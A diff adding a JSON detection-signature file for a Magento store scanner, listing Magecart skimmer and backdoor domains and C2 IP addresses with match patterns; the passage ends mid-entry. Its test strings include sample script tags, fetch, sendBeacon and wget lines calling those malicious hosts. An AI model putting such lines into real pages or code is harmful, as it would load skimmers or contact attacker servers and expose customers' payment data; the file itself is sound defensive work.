@@ -1,0 +1,770 @@
+{
+    "version": "2026.10.06",
+    "note": "Domain and IP indicators. They go stale; each entry expires on expires_on and should be re-checked before renewing.",
+    "signatures": [
+        {
+            "id": "cosmicsting-cdnstatistics-domain",
+            "name": "Reference to cdnstatistics.net skimmer domain",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "cdnstatistics.net",
+            "description": "Domain used by the CosmicSting skimmer campaign against Magento payment pages. Domain indicators go stale quickly; review before relying on it.",
+            "source": "https://sansec.io/research/cosmicsting",
+            "test_should_match": [
+                "<script src=\"https://cdnstatistics.net/track.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/js/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "stylesmuggler-c2-ip",
+            "name": "StylesSmuggler C2 server address 99.84.67.186",
+            "severity": "critical",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "99.84.67.186",
+            "description": "C2 address used by the CVE-2026-75650 StylesSmuggler backdoor. IP indicators go stale quickly; review before relying on it. Source: https://sansec.io/research/stylesmuggler-0day",
+            "source": "https://sansec.io/research/stylesmuggler-0day",
+            "test_should_match": [
+                "fetch('http://99.84.67.186/a9f3k2-c2')"
+            ],
+            "test_should_not_match": [
+                "fetch('http://199.84.67.18/status')"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "magecart-sendbeacon-fonts-domains",
+            "name": "Skimmer beacon to staticfonts/dynamicopenfonts lookalike domains",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "staticfonts.com",
+            "description": "Lookalike font-CDN domain used by a Magento credit-card skimmer that sends Base64 card data via beacon. Domain indicators go stale quickly; review before relying on it. Source: https://www.darkreading.com/application-security/sneaky-skimmer-malware-magento-sites-black-friday",
+            "source": "https://www.darkreading.com/application-security/sneaky-skimmer-malware-magento-sites-black-friday",
+            "test_should_match": [
+                "<script>navigator.sendBeacon('https://staticfonts.com/c', 'x');</script>"
+            ],
+            "test_should_not_match": [
+                "<script>navigator.sendBeacon('/analytics/collect', 'x');</script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "stylesmuggler-exfil-host-457cfa2fb7",
+            "name": "StyleSmuggler exfiltration host fragment",
+            "severity": "critical",
+            "source": "https://sansec.io/research/stylesmuggler-0day",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "457cfa2fb7",
+            "description": "Host label used by the StyleSmuggler payload when it calls out to its server. Source: Sansec, StyleSmuggler 0-day.",
+            "test_should_match": [
+                "$x = \"https://457cfa2fb7.example/\";"
+            ],
+            "test_should_not_match": [
+                "$x = \"https://example.com/\";"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "skimmer-exfil-ip-23-137-249-67",
+            "name": "Skimmer exfiltration IP 23.137.249.67",
+            "severity": "warning",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "23.137.249.67",
+            "description": "Address that the SVG-onload skimmer domains resolve to. IP indicators go stale quickly; review before relying on it. Source: Sansec, SVG onload Tag hides Magecart skimmer.",
+            "test_should_match": [
+                "fetch(\"https://23.137.249.67/fb_metrics\")"
+            ],
+            "test_should_not_match": [
+                "fetch(\"https://23.137.249.6/fb_metrics\")"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "hunter-skimmer-server-193-201-9-116",
+            "name": "Server hosting the Hunter skimmer domains",
+            "severity": "warning",
+            "source": "https://www.malwarebytes.com/blog/threat-intelligence/2023/03/hunter-skimmer",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "193.201.9.116",
+            "description": "Server that hosted the Hunter skimmer domains. IP indicators go stale quickly; review before relying on it. Source: Malwarebytes, Hunter skimmer.",
+            "test_should_match": [
+                "<script src=\"https://193.201.9.116/s.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://193.201.9.11/s.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "cosmicsting-skimmer-domains",
+            "name": "CosmicSting skimmer and exfiltration domains",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:branchbrookpharmacy\\.com|cantes\\.com|casamilanoitaly\\.com|giftboxedwines\\.com|larecetta\\.com|mercadoespiao\\.com|missy\\-x\\.com|decentcustom\\.com|derickdesign\\.com|efashionwholesale\\.com|hebery\\.com|rtechmx\\.com|zetabg\\.com|cdnstatics\\.net|statspots\\.com|quantunnquest\\.com|analytisgroup\\.com|analytisweb\\.com|bytesbazar\\.com|chartismart\\.com|codecarawan\\.com|creatls\\.com|datifyny\\.com|desynlabtech\\.com|getstylify\\.com|graphiqsw\\.com|happyllfe\\.online|horlzonhub\\.com|marketiqhub\\.com|marketsoilmart\\.com|novastraem\\.com|radlantroots\\.com|sellifypro\\.com|sellwisehub\\.com|statify\\.online|techtnee\\.com|trendgurupro\\.com|vizualis\\.online|advertispro\\.com|brandilift\\.com|countilancer\\.com|designlq\\.com|evaluatemingle\\.com|feedbackharvest\\.com|gettinfo\\.com|graphisprintstudio\\.com|insightharvesters\\.com|marketexpert\\.site|metricelevate\\.com|myhapperflowers\\.com|protocolhubinfo\\.com|reviewharborhub\\.com|salesguru\\.online|statistall\\.com|amocha\\.xyz|cd\\.iconstaff\\.top|cdn\\-webstats\\.com|cdn\\.iconstaff\\.top|cdn\\.inspectdlet\\.net|clearnetfab\\.net|cloudflare\\-stat\\.net|iconstaff\\.top|jquerypackageus\\.com|jqueryuslibs\\.com|jstatic201\\.com|lererikal\\.org|mamatmavali\\.ru|paie\\-locli\\.com|sellerstat\\.site|statsseo\\.com|statstoday\\.org|vincaolet\\.xyz|webexcelsior\\.org|udalzira\\.com|cdn\\.myshopper\\.io|fatrade\\.net|hostnotify\\.io|infiniboosts\\.com|itsemma\\.io|m\\.bingforce\\.org|rextension\\.net|servicetoast\\.net|sourcetrap\\.net|subsales\\.net|t\\.gearplace\\.net|tag\\.convertpro\\.org|tag\\.wealthleaderinc\\.com|tr\\.hostnotify\\.io|web\\.bystats\\.io|web\\.foptimize\\.net|consentime\\.com|ge4cdn\\.com|myshopper\\.io|youpilot\\.org)\\b/i",
+            "description": "Domains that the CosmicSting skimmer loads script from or sends card data to. Domain lists go stale quickly, and a few are compromised legitimate sites; review before relying on this. Source: Sansec, CosmicSting.",
+            "test_should_match": [
+                "<script src=\"https://statspots.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "cnext-backdoor-domains",
+            "name": "Domains used by the CosmicSting cnext persistent backdoor",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting-cnext-persistent-backdoor",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:sellerstat\\.site|clearnetfab\\.net|jqueryuslibs\\.com|jstatic201\\.com|lererikal\\.org|mamatmavali\\.ru|paie\\-locli\\.com|statsseo\\.com|statstoday\\.org|vincaolet\\.xyz|webexcelsior\\.org)\\b/i",
+            "description": "Command and beacon domains used by the cnext persistent backdoor. Domain lists go stale quickly; review before relying on this. Source: Sansec, CosmicSting cnext persistent backdoor.",
+            "test_should_match": [
+                "fetch(\"https://statstoday.org/beacon\")"
+            ],
+            "test_should_not_match": [
+                "fetch(\"https://example-shop.com/beacon\")"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "tripwire-skimmer-domains",
+            "name": "Magecart Tripwire skimmer domains",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magecart-tripwire",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:sslvalidator\\.com|rellicform\\.com|iocs\\.cdn\\.magecreativetech\\.com|cdn\\.onefromeu\\.com|cdn\\.pollocart\\.com|cdn\\.rellicform\\.com|cdn\\.scriptsenvoir\\.com|js\\.magecreativetech\\.com|js\\.onefromeu\\.com|js\\.pollocart\\.com|js\\.rellicform\\.com|js\\.scriptsenvoir\\.com|secure\\.rellicform\\.com|magecreativetech\\.com|onefromeu\\.com|pollocart\\.com|rellicform\\.com|scriptsenvoir\\.com|cdn\\.typejsx\\.com|cdnpayment\\.com|directvapar\\.com|directvapro\\.com|directvaprr\\.com|onlineshopsecurity\\.com|secure\\.onlineshopsecurity\\.com|secure\\.sslbrainform\\.com|secure\\.sslvalidator\\.com|sslbrainform\\.com|typejsx\\.com|cdnpayment\\.com|cdnppay\\.com|directvapar\\.com|directvapro\\.com|onlineshopsecurity\\.com|secure\\.sslbrainform\\.com|secure\\.sslvalidator\\.com|sslbrainform\\.com|sslvalidator\\.com|typejsx\\.com)\\b/i",
+            "description": "Script hosts and card-data endpoints used by the Magecart Tripwire skimmer. Domain lists go stale quickly; review before relying on this. Source: Sansec, Magecart Tripwire skimmer domains.",
+            "test_should_match": [
+                "<script src=\"https://sslvalidator.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "longest-skimming-operation-domains",
+            "name": "Domains from the longest-running skimming operation",
+            "severity": "critical",
+            "source": "https://sansec.io/research/longest-skimming-operation-yet",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:webstatvisit\\.com|jackhemmingway\\.com|editonepost\\.com|joyjewell\\.com|thefei\\.com|usballiance\\.org|boomerlifestage\\.com|bizlawyer\\.org|installerr\\.site|schiffmangroup\\.com|aleopeople\\.info|accurexmeasure\\.com|pizdasniff\\.site|vk\\-a6t5h7f3k\\.site|onlineclouds\\.info|contentequare\\.com|qitcdn\\.net|cdn\\.cquotinent\\.com|securedcdn\\.net|webstatvisit\\.com|onlineclouds\\.info)\\b/i",
+            "description": "Script hosts and exfiltration endpoints from a long-running Magecart operation. Domain lists go stale quickly; a few look like legitimate CDN names, so review before relying on this. Source: Sansec, Domains from the longest-running skimming operation.",
+            "test_should_match": [
+                "<script src=\"https://webstatvisit.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "north-korea-magecart-domains",
+            "name": "Domains from the North Korea-linked Magecart campaign",
+            "severity": "critical",
+            "source": "https://sansec.io/research/north-korea-magecart",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:luxmodelagency\\.com|signedbooksandcollectibles\\.com|stefanoturco\\.com|technokain\\.com|darvishkhan\\.net|areac\\-agr\\.com|luxmodelagency\\.com|signedbooksandcollectibles\\.com|papers0urce\\.com|focuscamere\\.com|claires\\-assets\\.com|areac\\-agr\\.com)\\b/i",
+            "description": "Script hosts and card-data endpoints from a campaign linked to North Korean actors. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the North Korea-linked Magecart campaign.",
+            "test_should_match": [
+                "<script src=\"https://luxmodelagency.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "gorgonagora-storefront-domains",
+            "name": "Domains of the Gorgonagora fake storefront network",
+            "severity": "critical",
+            "source": "https://sansec.io/research/gorgonagora-fake-storefront-skimming-network",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:certificatebatppp26\\.top|batppp556\\.top|newpay115\\.top|onepay114\\.top|onepay178\\.top|onepay234\\.top|onepay58\\.top)\\b/i",
+            "description": "Fake payment and certificate hosts used by the Gorgonagora network of fake storefronts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains of the Gorgonagora fake storefront network.",
+            "test_should_match": [
+                "<script src=\"https://certificatebatppp26.top/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "magentocore-skimmer-domain",
+            "name": "MagentoCore skimmer host",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magentocore.net-skimmer-most-aggressive-to-date",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "magentocore.net",
+            "description": "Host of the MagentoCore skimmer, which at its peak compromised thousands of stores. Source: Sansec, MagentoCore skimmer.",
+            "test_should_match": [
+                "wget -c https://magentocore.net/clean.json"
+            ],
+            "test_should_not_match": [
+                "wget -c https://magento.com/clean.json"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "widespread-credit-card-hijacking-domains",
+            "name": "Domains from the widespread credit card hijacking campaign",
+            "severity": "critical",
+            "source": "https://sansec.io/research/widespread-credit-card-hijacking-discovered",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:ownsafety\\.org|useagleslogistics\\.com|redwiggler\\.org|gamula\\.ru|news\\-daily\\.me|antaras\\.xyz|clicksale\\.xyz|ausfunken\\.com|nearart\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the widespread credit card hijacking campaign.",
+            "test_should_match": [
+                "<script src=\"https://ownsafety.org/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "visbot-domains",
+            "name": "Domains from the Visbot malware on 6,691 stores",
+            "severity": "critical",
+            "source": "https://sansec.io/research/visbot-malware-on-6691-stores-analysis",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:visvo\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the Visbot malware on 6,691 stores.",
+            "test_should_match": [
+                "<script src=\"https://visvo.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "magento-breach-analysis-domain",
+            "name": "Analytics CDN used in a Magento breach",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-breach-analysis",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:analiticoscdn\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Analytics CDN used in a Magento breach.",
+            "test_should_match": [
+                "<script src=\"https://analiticoscdn.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "fake-magento-patch-9789-domains",
+            "name": "Domains from the fake Magento patch 9789 malware",
+            "severity": "critical",
+            "source": "https://sansec.io/research/fake-magento-patch-9789-is-virus",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:hal\\-pc\\.org)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the fake Magento patch 9789 malware.",
+            "test_should_match": [
+                "<script src=\"https://hal-pc.org/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "helpdesk-phishing-domain",
+            "name": "Helpdesk domain used to breach Magento",
+            "severity": "critical",
+            "source": "https://sansec.io/research/hackers-breach-magento-through-helpdesk",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:helpdeskjs\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Helpdesk domain used to breach Magento.",
+            "test_should_match": [
+                "<script src=\"https://helpdeskjs.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "fake-google-analytics-domains",
+            "name": "Lookalike Google Analytics domains",
+            "severity": "critical",
+            "source": "https://sansec.io/research/fake-google-analytics-malware",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:g\\-analytics\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Lookalike Google Analytics domains.",
+            "test_should_match": [
+                "<script src=\"https://g-analytics.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "csu-shop-magecarted-domains",
+            "name": "Domains from the CSU shop Magecart compromise",
+            "severity": "critical",
+            "source": "https://sansec.io/research/csu-shop-magecarted",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:records\\.nstatistics\\.com|b0b127c6\\.ngrok\\.io)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the CSU shop Magecart compromise.",
+            "test_should_match": [
+                "<script src=\"https://records.nstatistics.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "warring-magecart-domains",
+            "name": "Lookalike script CDNs from the warring Magecart factions",
+            "severity": "critical",
+            "source": "https://sansec.io/research/warring-magecart-factions",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:js\\-react\\.com|bootstrap\\-js\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Lookalike script CDNs from the warring Magecart factions.",
+            "test_should_match": [
+                "<script src=\"https://js-react.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "magento-2-hacks-domains",
+            "name": "Domains from the Magento 2 hacks write-up",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-hacks",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:bootstrapscdn\\.org|soprr\\.ru|zhilkom\\-24\\.ru)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the Magento 2 hacks write-up.",
+            "test_should_match": [
+                "<script src=\"https://bootstrapscdn.org/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "sanguine-skimmer-domains",
+            "name": "Domains of the Sanguine Magecart group",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magecart-hackers-target-sanguine",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:sanguinelab\\.net|live\\.sequracdn\\.net)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains of the Sanguine Magecart group.",
+            "test_should_match": [
+                "<script src=\"https://sanguinelab.net/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "magecart-net-domain",
+            "name": "Magecart domain named in the Magecart arrests write-up",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magecart-hackers-arrested",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:magecart\\.net)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Magecart domain named in the Magecart arrests write-up.",
+            "test_should_match": [
+                "<script src=\"https://magecart.net/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "jqueres-skimmer-domain",
+            "name": "Skimmer host shared by the polymorphic skimmer and Puma campaigns",
+            "severity": "critical",
+            "source": "https://sansec.io/research/polymorphic-skimmer-57-payment-gateways",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:jqueres\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Skimmer host shared by the polymorphic skimmer and Puma campaigns.",
+            "test_should_match": [
+                "<script src=\"https://jqueres.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "atlanta-hawks-imagesengines-domain",
+            "name": "Skimmer host from the Atlanta Hawks Magecart incident",
+            "severity": "critical",
+            "source": "https://sansec.io/research/atlanta-hawks-magecart",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:imagesengines\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as skimmer or malware hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Skimmer host from the Atlanta Hawks Magecart incident.",
+            "test_should_match": [
+                "<script src=\"https://imagesengines.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "cardbleed-domains",
+            "name": "Domains from the CardBleed Magento compromise",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cardbleed",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:mcdnn\\.net|mcdnn\\.me|ajaxcloudflare\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as malicious hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the CardBleed Magento compromise.",
+            "test_should_match": [
+                "<script src=\"https://mcdnn.net/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "google-services-skimmer-domains",
+            "name": "Lookalike service domains from the Google-services skimming campaigns",
+            "severity": "critical",
+            "source": "https://sansec.io/research/google-services-abused-skimming-campaigns",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:js\\-stats\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as malicious hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Lookalike service domains from the Google-services skimming campaigns.",
+            "test_should_match": [
+                "<script src=\"https://js-stats.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "klaviyo-smtp-domain",
+            "name": "SMTP host used by the fake Klaviyo account campaign",
+            "severity": "critical",
+            "source": "https://sansec.io/research/fake-klaviyo-accounts-added-to-magento",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:smtp\\.emailgenius\\.org)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as malicious hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, SMTP host used by the fake Klaviyo account campaign.",
+            "test_should_match": [
+                "<script src=\"https://smtp.emailgenius.org/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "postponed-exfiltration-domain",
+            "name": "Lookalike analytics domain from the postponed exfiltration campaign",
+            "severity": "critical",
+            "source": "https://sansec.io/research/postponed-exfiltration-evades-detection",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:gtag\\-analytics\\.com)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as malicious hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Lookalike analytics domain from the postponed exfiltration campaign.",
+            "test_should_match": [
+                "<script src=\"https://gtag-analytics.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "google-services-attacker-ip",
+            "name": "Attacker IP from the Google-services skimming campaigns",
+            "severity": "warning",
+            "source": "https://sansec.io/research/google-services-abused-skimming-campaigns",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:94\\.131\\.105\\.71)\\b/",
+            "description": "Attacker address(es) named in this Sansec write-up. IP indicators go stale quickly; review before relying on this. Source: Sansec, Attacker IP from the Google-services skimming campaigns.",
+            "test_should_match": [
+                "fetch('http://94.131.105.71/c2')"
+            ],
+            "test_should_not_match": [
+                "fetch('http://10.0.0.1/c2')"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "skimmer-base64-exfil-domains",
+            "name": "Base64-encoded exfiltration domains in the dynamic skimmer",
+            "severity": "critical",
+            "source": "https://sansec.io/research/skimmer-dynamic-exfiltration-shopify-bigcommerce",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\bzg9tywlubmftzw5ld[a-z0-9]*\\.com\\b/i",
+            "description": "Exfiltration hosts whose names are base64-encoded in the skimmer, which numbers its subdomains. Source: Sansec, skimmer with dynamic exfiltration to Shopify and BigCommerce.",
+            "test_should_match": [
+                "https://zg9tywlubmftzw5ldza.com/collect"
+            ],
+            "test_should_not_match": [
+                "https://shop.example.com/collect"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "sessionreaper-domains",
+            "name": "Domains from the SessionReaper exploitation campaign",
+            "severity": "critical",
+            "source": "https://sansec.io/research/sessionreaper",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:safecrafft\\.com|sagecrafft\\.com|worcksbot\\.com|tecnokauf\\.ru)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as malicious hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Domains from the SessionReaper exploitation campaign.",
+            "test_should_match": [
+                "<script src=\"https://safecrafft.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "polyshell-mass-attack-domain",
+            "name": "Host from the PolyShell mass attack wave",
+            "severity": "critical",
+            "source": "https://sansec.io/research/polyshell-mass-attack-wave",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:lanhd6549tdhse\\.top)\\b/i",
+            "description": "Domain(s) named in this Sansec write-up as malicious hosts. Domain lists go stale quickly; review before relying on this. Source: Sansec, Host from the PolyShell mass attack wave.",
+            "test_should_match": [
+                "<script src=\"https://lanhd6549tdhse.top/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.example-shop.com/app.js\"></script>"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "sessionreaper-attacker-ips",
